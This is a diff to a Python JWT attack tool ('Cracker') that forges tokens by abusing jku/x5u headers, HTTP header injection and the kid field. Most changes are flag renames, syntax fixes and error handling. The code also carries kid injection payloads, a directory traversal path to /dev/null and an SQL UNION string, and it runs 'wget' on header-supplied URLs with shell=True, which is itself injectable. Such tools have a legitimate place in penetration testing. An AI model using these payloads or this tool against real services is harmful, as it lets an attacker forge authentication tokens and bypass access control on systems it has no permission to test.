@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/local/bin/python3.8
 
 """
    A file for test new implementation globally, before merging in the main file.
@@ -94,13 +94,13 @@ class Cracker:
                                     your url. To do this you need to specify the exact place in
                                     the main url, where your url has to be attached. This is done
                                     with the keyword HERE. Look at the examples for more details.]
-           --jku-body <mainURL>    [Try to exploit an http header injection to inject the jwks in
+           --jku-inbody <mainURL>  [Try to exploit an http header injection to inject the jwks in
                                     the http response of the url. Use the HERE keyword to let the
                                     tool know where to inject the jwks.]
            --x5u-basic <yourURL>   [Same as --jku-basic but with x5u header. The x5u allow to link
                                     an url to a jwks file containing a certificate. The tool will
                                     generate a certificate an wiil craft a proper jwks file.]
-           --x5u-body <mainURL>    [Same as --jku-body but with x5u header.]
+           --x5u-inbody <mainURL>  [Same as --jku-body but with x5u header.]
            --manual                [This bool flag allow you to manually craft an url for the jku
                                     or x5u header, if used with --jku-basic or --x5u-basic.
                                     This is needed since in some situations, automatic options
@@ -174,7 +174,7 @@ class Cracker:
         self.unverified = unverified
         self.decode = decode
         self.manual = manual
-        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_body]
+        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection]
         self.x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/C=US/State=Ohio/L=Columbus/O=TestingInc/CN=testing"'
         self.devnull = open(os.devnull, 'wb')
         # print(self.token, self.alg, self.path_to_key, self.user_payload, self.auto_try, self.unverified, self.decode)		# DEBUG
@@ -244,7 +244,7 @@ class Cracker:
             self.alg = "RS256"
         """--manual can be used only with jku-basic or x5u-basic"""
         if self.manual:
-            if not self.jku_basic and not self.x5u.basic:
+            if not self.jku_basic and not self.x5u_basic:
                 print(f"{Bcolors.FAIL}ERROR: You can use --manual only with jku/x5u basic.{Bcolors.ENDC}")
                 sys.exit(1)
         """Validate key"""
@@ -327,9 +327,9 @@ class Cracker:
                       self.alg, self.path_to_key, self.user_payload,
                       self.auto_try, self.kid, self.specified_key,
                       self.jku_basic, self.jku_redirect, self.jku_header_injection,
-                      self.remove_from, self.x5u_basic, self.x5u_body,
+                      self.remove_from, self.x5u_basic, self.x5u_header_injection,
         ]
-        if any(arg is not None for arg in other_args) or self.unverified, or self.manual:
+        if any(arg is not None for arg in other_args) or self.unverified or self.manual:
             print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
         print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
               "\n" +
@@ -361,13 +361,13 @@ class Cracker:
         if self.add_into:
             for item in self.add_into:
                 to_dict = item[0].split(":")[0]
-                to_add = item[0].split(":")[0]
+                to_add = item[0].split(":")[1]
                 if to_dict != "header" and to_dict != "payload":
                     print(f"{Bcolors.FAIL}You can delete keys only from header and payload.{Bcolors.ENDC}")
                     sys.exit(2)
                 if to_dict == "header":
                     if to_add in header_dict.keys():
-                        print(f"{Bcolors.FAIL}You are trying to add a key that alreay exists.{Bcolors.ENDC}")
+                        print(f"{Bcolors.FAIL}You are trying to add a key that already exists.{Bcolors.ENDC}")
                         sys.exit(1)
                     header_dict[to_add] = "default"
                 elif to_dict == "payload":
@@ -377,7 +377,7 @@ class Cracker:
                         sys.exit(2)
                     payload_dict[to_add] = "default"
         if self.kid:
-            header_dict['kid'] = self.inject_kid()
+            header_dict['kid'] += self.inject_kid()
         elif self.jku_basic:
             if "jku" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
@@ -455,7 +455,11 @@ class Cracker:
         crafted/jwks.json and write into it the dumps of the dict.
         """
         command = "wget " + header['jku']
-        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        try:
+            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        except subprocess.CalledProcessError:
+            print(f"{Bcolors.FAIL}Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
+            sys.exit(1)
         for file in os.listdir():
             if file.endswith(".json"):
                 filename = file
@@ -484,7 +488,11 @@ class Cracker:
         :return: The crafted jwks string in an http response body format.
         """
         command = "wget " + header['jku']
-        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        try:
+            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        except subprocess.CalledProcessError:
+            print(f"{Bcolors.FAIL}Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
+            sys.exit(1)
         for file in os.listdir():
             if file.endswith(".json"):
                 filename = file
@@ -505,7 +513,11 @@ class Cracker:
 
     def x5u_basic_attack(self, header):
         command = "wget " + header['x5u']
-        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        try:
+            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        except subprocess.CalledProcessError:
+            print(f"{Bcolors.FAIL}Can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
+            sys.exit(1)
         # Retrieve the right filename    TODO: Implement it in a better way
         for file in os.listdir():
             if file.endswith(".json"):
@@ -525,7 +537,10 @@ class Cracker:
 
     def x5u_via_header_injection(self, header):
         command = "wget " + header['x5u']
-        command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        try:
+            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
+        except subprocess.CalledProcessError:
+            print(f"{Bcolors.FAIL}Can't download the jwks file from the url specified in x5u header{Bcolors.ENDC}")
         for file in os.listdir():
             if file.endswith(".json"):
                 filename = file
@@ -589,7 +604,7 @@ class Cracker:
         """
         kid_payloads = {
             "DirTrv": "../../../../../dev/null",
-            "SQLi": "0001' union select 'zzz",
+            "SQLi": "' union select 'zzz",
         }
 
         if self.kid == "DirTrv":
@@ -872,9 +887,10 @@ if __name__ == '__main__':
                         help="The section of the token, and the key name to delete as key:value pairs",
                         metavar="<section>:<key>", required=False,
                         )
-    parser.add_argument("--add-into", action="append", neargs="*",
+    parser.add_argument("--add-into", action="append", nargs="*",
                         help="The section of the token, and the key name to add as key:value pairs",
                         metavar="<section>:<key>", required=False
+                        )
     parser.add_argument("--unverified", action="store_true",
                         help="Treat the host as it doesn't verify the signature",
                         required=False
@@ -899,7 +915,7 @@ if __name__ == '__main__':
                         help="Specify the url with a redirect to the host where jwks.json file will be hosted",
                         metavar="<mainURL,yourURL>", required=False
                         )
-    parser.add_argument("--jku-body",
+    parser.add_argument("--jku-inbody",
                         help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject",
                         metavar="<mainURL>", required=False
                         )
@@ -907,9 +923,10 @@ if __name__ == '__main__':
                         help="Specify your ip or domain to host the jwks.json file",
                         metavar="<yourURL>", required=False
                         )
-    parser.add_argument("--x5u-body",
+    parser.add_argument("--x5u-inbody",
                         help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject",
-                        metavar="<mainURL", required=False
+                        metavar="<mainURL>", required=False
+                        )
     parser.add_argument("--manual", action="store_true",
                         help="Specify this flag with jku/x5u basic if you need to craft an url without the tool appending or replaceing anything to it",
                         required=False
@@ -920,7 +937,7 @@ if __name__ == '__main__':
 
     cracker = Cracker(
         args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.specify_key,
-        args.jku_basic, args.jku_redirect, args.jku_body, args.x5u_basic, args.x5u_body, args.unverified, args.decode, args.manual
+        args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody, args.unverified, args.decode, args.manual
     )
     # print(args.payload)	# DEBUG
     # print(cracker.key)	# DEBUG
